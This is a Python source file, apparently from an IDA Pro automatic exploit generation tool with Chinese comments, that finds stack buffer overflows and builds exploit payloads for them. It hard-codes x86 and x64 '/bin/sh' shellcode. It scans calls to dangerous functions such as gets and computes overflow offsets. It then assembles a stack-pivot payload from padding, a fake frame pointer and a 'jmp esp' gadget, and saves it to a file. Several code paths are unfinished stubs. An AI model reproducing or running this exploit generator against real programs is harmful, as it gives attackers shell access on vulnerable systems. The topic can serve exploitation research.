#-*- coding:utf-8 -*-
'''
跟缓冲区相关的函数、功能、检测
'''


from AEGconfig import *
from idc import *
from AEGcommon import *
import struct
import AEGfunction
import AEGInstruction
from AEGexceptions import *
from AEGinfo import *
from AEGagent import *

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
shellcode_x64 = "H1\xc9H\xf7\xe1QH\xbb/bin//shSH\x89\xe3\xb0\x0b\xcd\x80"
def StackPivot(offset_BP , filename = INFO_INPUT_FILENAME):
	'''
	Staack Pivoting:栈转移
	必须要有gadget -- jmp esp

	@offset_BP :从缓冲区的位置0，到BP的距离。即：

	|buffer [0] | buffer[1] |...|EBP/RBP

	| <----		offset_BP --->	|   
	
	@filename: 需要找gadget的文件。有时候gadget用的是.so库文件，此时需要指定filename为该so文件
	
	'''
	if INFO_BITS == 32:
		shellcode = shellcode_x86
		fake_bp = struct.pack("I" ,0xdeadbeef)
	else:
		shellcode = shellcode_x64
		fake_bp = struct.pack("Q" ,0xdeadbeefae9caffe)	

	padding_size = offset_BP - len(shellcode)
	printf("Stack Pivot: padding size = %d" % padding_size , verbose= LOG_LEVEL_DEBUG)
	if padding_size < 0 :
		printf("buffer size too small to apply a Stack pivot" , verbose = LOG_LEVEL_WARN) 
		return None


	_gadgets = ROPGadget_agent(addition_cmd=' --only "jmp|ret"')
	
	jmp_esp_gadget = None
	for line in _gadgets:
		if "jmp esp" in line:
			jmp_esp_gadget_int = line.split(':')[0].strip().replace("0x" ,"")
			jmp_esp_gadget_int = int(jmp_esp_gadget_int, base = 16)
			if INFO_BITS == 64:
				jmp_esp_gadget = struct.pack("Q" , jmp_esp_gadget_int)
			else:
				jmp_esp_gadget = struct.pack("I" , jmp_esp_gadget_int)

	#jmp_esp_gadget = Get_ropgadget( filename, 1)
	if jmp_esp_gadget is None:
		printf("No jmp esp gadget. Stack pivoting fail." , verbose=LOG_LEVEL_WARN)
		return None
	printf("find jmp_esp_gadget. %s  Using Tech: Stack pivot" % (jmp_esp_gadget_int))
	
	if INFO_BITS == 32:
		jmp_and_sub_sp_cmd = "print asm('sub esp, 0x%x;jmp esp');" % (offset_BP + (INFO_BITS / 8 ) * 2)
	elif INFO_BITS == 64:
		jmp_and_sub_sp_cmd = "print asm('sub rsp, 0x%x;jmp rsp');" % (offset_BP + (INFO_BITS / 8 ) * 2)
	else:
		raise NotImplementedException("Err INFO_BITS")

	jmp_and_sub_esp = pwntools_agent(jmp_and_sub_sp_cmd)

	#print (hex(jmp_esp_gadget))
	#print (jmp_and_sub_esp)
	shellcode = shellcode + padding_size * 'b' + fake_bp \
				+  jmp_esp_gadget +  jmp_and_sub_esp
	
	printf ("Stack pivot success! final shellcode: " + shellcode)
	return shellcode

def _DetectDangerFuncs():
	'''
	检测方法1：从危险函数出发 ，找到其所有引用，查看是否存在溢出的可能 
	如果溢出，返回 (压入参数的指令地址，总输入长度(size) , 输入的地方距离BP的长度)
	'''
	

	def _sizeCheck(arg_addr):
		'''
		@arg_addr: 要检查的参数所在指令的地址。
					比如  0x8048123: push $0xa		
		'''
		instr = AEGInstruction.AEG_Instruction(arg_addr)
		_op = instr.GetOperator()
		printf("_size check::%x" % arg_addr , verbose=LOG_LEVEL_DEBUG)
		if _op == 'push':
			_size = instr.GetOperand(0)
			printf( "Pushing operand(size) to arg : " + str(_size) , verbose=LOG_LEVEL_DEBUG)
		elif _op == "mov":
			## mov [ESP + xxx], $imm
			_size = instr.GetOperand(1)
			if 'h' in _size.lower():
				_size = int(_size.lower().strip('h') , base=16)
			else:
				_size = int(_size , base = 10)
			printf( "Moving operand(size) to arg : " + str(_size),verbose=LOG_LEVEL_DEBUG)
		else:
			raise NotImplementedException('_op = ' + _op)
		return _size

	def _bufferCheck(arg_addr):
		instr = AEGInstruction.AEG_Instruction(arg_addr)
		_op = instr.GetOperator()
		#print type(instr.GetStackVar(1))
		if _op == 'push':
			buffer_opnd = instr.GetOperand(0)
			print "pushing operand (buffer) to arg :" + str(buffer_opnd)
		elif _op == "mov":
			buffer_opnd = instr.GetOperand(1)
			print "moving operand (buffer) to arg :" + str(buffer_opnd)
		else:
			raise NotImplementedException()

		### buffer类型可能会有通过寄存器来完成压栈的情况，需要向上寻找。
		buffer_opnd_type = instr.GetOpndType(1)
		if buffer_opnd_type == o_reg:
			function_head = AEGfunction.AEG_GetFunctionHead(instr.addr)
			_tmp_addr = instr.addr
			_stack_var = None
			while True:
				_tmp_addr = idc.PrevHead(_tmp_addr)
				printf("buffer check ::Checking tmp_addr: %x" % _tmp_addr , verbose=LOG_LEVEL_DEBUG )
				_instr_dec = AEGInstruction.AEG_Instruction(_tmp_addr)
				_op = _instr_dec.GetOperator().lower()
				if _op in ("ret", "retn", "jmp", "b") or _tmp_addr < function_head:
					printf("Encounter control flow changes" , verbose=LOG_LEVEL_DEBUG)
					raise NotImplementedException()
					
				elif _op == "lea" and _instr_dec.GetOperand(0) == buffer_opnd:
					_stack_var = _instr_dec.GetStackVar(1)
					if  _stack_var !=  None:
						
						printf("Find a stack var that pass to args: %x  %x." % (instr.addr, _instr_dec.addr))
						_stack_var_name = _instr_dec.GetOperand(1).strip('[').strip(']').replace(
							'ebp' if INFO_BITS == 32 else 'rbp' , '').replace('''+''','')
						return _stack_var_name
					else:
						printf("Not stack var (%x) " % _tmp_addr)
						break
				elif _op == "mov" and _instr_dec.GetOperand(0)== buffer_opnd:
					## 
					raise NotImplementedException()
					op_type = _instr_dec.GetOpndType(1)
					if op_type == o_reg :
						opnd = _instr_dec.GetOperand(1)
						raise NotImplementedException()
					else:
						raise NotImplementedException()
		pass


	D_funcs = AEGfunction.AEG_GetDangerousFunctions()
	printf("Got Dangerous Functions" +str(D_funcs) ,
			verbose=LOG_LEVEL_DEBUG)

	for danger_func in D_funcs :
		xrefs = AEG_GetCodeXrefsTo(danger_func.addr)
		for xref in xrefs:
			if AEGInstruction.AEG_AnalyseRefs(xref) == 'call':
				printf("Find a call to danger func:%s" % danger_func ,verbose=LOG_LEVEL_DEBUG)
				all_args = AEGfunction.AEG_GetFuncArgs(xref)
				printf(map(hex ,all_args) , verbose=LOG_LEVEL_DEBUG)


				_unlimited = False
				## size check 
				if hasattr(danger_func , 'size_idx'):
					_size = _sizeCheck(all_args[danger_func.size_idx]) 
					if _size is None:
						## size check fail
						printf("Size check fail at %x" % all_args[danger_func.size_idx] , verbose=LOG_LEVEL_WARN)
						return None
					
				else: 
					## 没有size_idx属性，比如gets之类的函数，一定溢出
					_unlimited = True

				### buffer check
				_stack_var_name = _bufferCheck(all_args[danger_func.buffer_idx])
				if _stack_var_name is None:
					printf("Buffer check fail." , verbose=LOG_LEVEL_WARN)
					return None
				import AEGframe
				_offset = AEGframe.get_stack_arg_offset(
							all_args[danger_func.buffer_idx],
							_stack_var_name
							)
				if _offset < 0:
					_offset = 0 - _offset
				if _unlimited or  _size > _offset:
					printf("Buffer overflow found! xref: %x" % xref)
					return all_args[danger_func.buffer_idx] , _size , _offset

			else:
				raise NotImplementedException()


def FrameFaking():
	pass



def BufferOverflowDetector():
	_tmp = _DetectDangerFuncs()
	if _tmp is not None:
		_tmp , input_size , offset_BP = _tmp
		printf("input_size = %d, ofsset_bp = %d" % (input_size , offset_BP) , verbose=LOG_LEVEL_DEBUG)
		shellcode = StackPivot(offset_BP)
		if not shellcode:
			### Fake Frame
			FrameFaking()
		else:
			## 保存shellcode
			AEG_save_file(INFO_INPUT_FILENAME + ".stackpivot",shellcode,"wb")
	else :
		raise NotImplementedException()
	pass
